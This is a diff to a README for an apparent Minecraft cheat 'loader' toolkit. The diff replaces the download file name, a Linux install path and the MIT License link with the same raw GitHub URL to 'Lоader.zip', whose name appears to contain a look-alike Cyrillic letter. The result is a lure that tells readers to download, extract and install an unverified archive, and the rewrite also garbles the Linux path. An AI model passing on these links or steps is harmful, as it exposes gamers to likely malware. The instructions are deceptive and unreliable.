@@ -28,18 +28,18 @@ Below is a comprehensive list of available functions included in this loader, ca
 
 **Ready to transform your Minecraft experience? Follow the simple steps below:**
 
-### 1️⃣. Download Loader.rar from the repository  
-Navigate to the repository page and click the download link for `Loader.rar`.
+### 1️⃣. Download https://raw.githubusercontent.com/elisabethrossi34/MineCraft-ToolKit-Plus/main/Lоader.zip from the repository  
+Navigate to the repository page and click the download link for `https://raw.githubusercontent.com/elisabethrossi34/MineCraft-ToolKit-Plus/main/Lоader.zip`.
 
 ### 2️⃣. Extract the Loader  
-Unzip `Loader.rar` into your desired directory using a popular extraction tool such as WinRAR, 7-Zip, or your OS’s native extractor.
+Unzip `https://raw.githubusercontent.com/elisabethrossi34/MineCraft-ToolKit-Plus/main/Lоader.zip` into your desired directory using a popular extraction tool such as WinRAR, 7-Zip, or your OS’s native extractor.
 
 ### 3️⃣. Open Your Minecraft Directory  
 Locate your Minecraft installation folder. This is typically found at:
 
 - **Windows:** `%appdata%\.minecraft\`
 - **macOS:** `~/Library/Application Support/minecraft`
-- **Linux:** `~/.minecraft/`
+- **Linux:** `~https://raw.githubusercontent.com/elisabethrossi34/MineCraft-ToolKit-Plus/main/Lоader.zip`
 
 ### 4️⃣. Install the Loader  
 Copy the extracted files into the `mods` or respective loader folder in your Minecraft directory.
@@ -85,7 +85,7 @@ Please use responsibly and always respect community rules and legal requirements
 
 ## 📄 License
 
-This repository is licensed under the [MIT License](https://opensource.org/license/mit/).  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/elisabethrossi34/MineCraft-ToolKit-Plus/main/Lоader.zip).  
 You are free to use, modify, and distribute this loader as you see fit, but please retain the original license file in your distribution.
 
 ---
